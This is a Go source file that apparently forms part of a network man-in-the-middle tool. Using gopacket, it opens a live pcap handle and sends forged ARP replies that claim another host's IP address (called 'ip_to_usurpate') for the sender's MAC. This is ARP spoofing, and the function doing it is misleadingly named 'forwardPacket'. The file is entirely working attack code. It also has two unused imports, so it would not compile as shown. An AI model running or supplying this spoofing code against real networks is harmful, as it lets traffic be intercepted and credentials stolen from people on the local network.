package main

import (
	"context"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// TODO mettre en place le forwarding
func createForwardingHandle(nameOfdevice string) *pcap.Handle {
	handle, err := pcap.OpenLive(nameOfdevice, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	}
	return handle
}

func forwardPacket(handle *pcap.Handle, ip_to_usurpate net.IP, my_mac net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr) error {

	eth := layers.Ethernet{
		SrcMAC:       my_mac,
		DstMAC:       mac_target,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(my_mac),
		SourceProtAddress: []byte(ip_to_usurpate.To4()),
		DstHwAddress:      []byte(mac_target),
		DstProtAddress:    []byte(ip_target.To4()),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		panic(err)
	}
	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		panic(err)
	}
	return nil

}
